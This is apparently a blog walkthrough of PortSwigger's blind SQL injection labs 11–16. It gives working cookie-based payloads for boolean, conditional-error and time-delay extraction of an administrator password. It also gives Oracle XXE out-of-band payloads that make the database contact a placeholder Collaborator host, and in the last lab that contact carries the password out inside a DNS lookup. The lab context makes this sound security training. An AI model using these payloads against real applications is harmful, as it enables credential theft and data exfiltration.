---
title: "PortSwigger SQL Injection Labs — Part 4: Blind SQL Injection"
date: 2026-09-22 06:30:00 +0000
categories: [Web Penetration Testing]
tags: [SQL Injection, PortSwigger, Web Security Academy, Blind SQLi]
description: "Exploiting blind SQL injection with boolean responses, conditional errors, time delays and out-of-band (OAST) interactions."
author: Paschal Sangawe
toc: true
---

Blind SQL injection is the case where the query result never comes back in the response. We cannot simply `UNION SELECT` the data, because there is nothing rendered. Instead we ask the database true/false questions and observe a side channel: a change in the page, a conditional error, a delay, or an out-of-band request. This part covers labs 11–16.

All six labs use the same primitive — a `TrackingId` cookie that is concatenated into an analytics query:

```sql
SELECT ... FROM ... WHERE trackingId = '<cookie value>'
```

## Lab 11 — Blind SQL injection with conditional responses

**Difficulty:** Practitioner
**Database:** MySQL
**Goal:** Extract the administrator password and log in.

The page shows a "Welcome back" message only when the analytics query returns rows. We can turn that into a boolean oracle.

**Confirm the oracle:**

```sql
TrackingId=xyz' AND '1'='1
TrackingId=xyz' AND '1'='2
```

The first shows "Welcome back"; the second does not. Now confirm the `users` table and the administrator user exist:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

**Find the password length:**

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Increment the number until the condition goes false. Here the password is 20 characters.

**Extract the password character by character.** Use `SUBSTRING()` and Burp Intruder:

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```

- Payload position: the character after `='`.
- Payload list: `a–z` and `0–9` (the lab guarantees lowercase alphanumerics).
- Grep-Match on `Welcome back`; the row with a hit reveals the character.
- Increment the `SUBSTRING` offset (`1,1` → `2,1` …) for each position.

> **[Screenshot]** Burp Intruder results with the `Welcome back` grep column ticked for exactly one payload.

## Lab 12 — Blind SQL injection with conditional errors

**Difficulty:** Practitioner
**Database:** Oracle
**Goal:** Same as Lab 11, but the only signal is whether a SQL error occurs.

First confirm the injection and the database:

```sql
TrackingId=xyz'                                  -- error
TrackingId=xyz''                                 -- no error
TrackingId=xyz'||(SELECT '' FROM dual)||'         -- resolves the error (Oracle needs a FROM)
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'  -- error again
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'   -- no error => users exists
```

Now build a conditionally-erroring subquery with `CASE` and a divide-by-zero:

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Change `1=1` to `1=2` and the error disappears — we now have a per-condition error oracle. Confirm the administrator exists:

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Find the length:**

```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Extract each character** by moving the comparison into the `CASE` and using `SUBSTR()`:

```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Use Burp Intruder with a simple `a–z0–9` list; the correct character produces HTTP 500, the rest HTTP 200, so the Status column finds it instantly.

> **[Screenshot]** Intruder results sorted by status, showing the single 500 response per position.

## Lab 13 — Blind SQL injection with time delays

**Difficulty:** Practitioner
**Database:** PostgreSQL
**Goal:** Cause a 10 second delay.

When the response gives no boolean or error signal, we can still measure time. PostgreSQL provides `pg_sleep()`:

```sql
TrackingId=x'||pg_sleep(10)--
```

The application takes 10 seconds to respond. Time-based blind is the fallback when nothing is reflected, but it is slower and noisier.

Other databases: MySQL `SLEEP(10)`, Microsoft SQL Server `WAITFOR DELAY '0:0:10'`, Oracle `dbms_pipe.receive_message(('a'),10)`.

## Lab 14 — Blind SQL injection with time delays and information retrieval

**Difficulty:** Practitioner
**Database:** PostgreSQL
**Goal:** Extract the administrator password using timing only.

Build a conditional delay with `CASE` (URL-encoded `;` is `%3B`, `'` is `%27`; below shown with `%3B` for the stacked query):

```sql
TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

Confirm the administrator row:

```sql
TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

**Find the length:**

```sql
TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

**Extract each character:**

```sql
TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

In Burp Intruder:

- Set **Maximum concurrent requests to 1** in the resource pool so timing measurements are not distorted by parallel requests.
- Watch the "Response received" column: the correct character takes roughly 10,000 ms.

> **[Screenshot]** Intruder results with one row near 10 s in the "Response received" column.

## Lab 15 — Blind SQL injection with out-of-band interaction

**Difficulty:** Practitioner
**Database:** Oracle
**Goal:** Trigger a DNS lookup to Burp Collaborator.

When the query runs asynchronously and gives no page, error or timing signal, out-of-band application security testing (OAST) is the way in. On Oracle we can abuse `EXTRACTVALUE` with an XML external entity that resolves to a Collaborator domain:

```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Replace `BURP-COLLABORATOR-SUBDOMAIN` with a real Collaborator subdomain (in Burp: right-click → *Insert Collaborator payload*), send the request, then poll Collaborator for a DNS/HTTP interaction.

> **Using Community Edition:** Burp Collaborator needs Professional. You can use a self-hosted OAST server such as `interactsh` (`interactsh-client`) or `canarytokens.org` and substitute its hostname.

## Lab 16 — Blind SQL injection with out-of-band data exfiltration

**Difficulty:** Practitioner
**Database:** Oracle
**Goal:** Leak the administrator password through a DNS lookup.

Same technique, but instead of a static Collaborator host we prepend the data:

```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

The database performs a DNS lookup for `<password>.your-collaborator-domain`. Poll Collaborator; the password appears as the subdomain of the interaction. Log in as administrator.

> **[Screenshot]** Collaborator interaction list where the subdomain contains the exfiltrated password.

## Takeaways

- Pick the cheapest available channel first: boolean → error → timing → OAST.
- Boolean and error oracles let you binary-search or brute force a single character at a time; automate with Intruder and deterministic grep/status matching.
- On timing attacks, force a single-threaded resource pool or the delays blur together.
- When everything else is quiet, OAST (Collaborator/interactsh) can both confirm the bug and exfiltrate data.

Next: [Part 5 — WAF Bypass with XML Encoding](/posts/portswigger-sqli-part-5-filter-bypass-xml-encoding/).
